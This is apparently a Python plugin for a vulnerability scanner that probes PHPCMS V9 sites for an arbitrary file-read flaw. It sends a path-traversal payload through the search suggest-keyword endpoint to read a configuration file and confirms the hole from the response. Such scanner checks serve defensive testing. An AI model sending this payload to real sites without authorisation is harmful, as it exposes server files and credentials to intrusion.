#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by lkz
#refer:http://www.2cto.com/Article/201207/142839.html
#phpcms V9任意读文件漏洞
import re

def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    payload = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/version.php"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    m = re.search('pc_release',res)
    if m:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])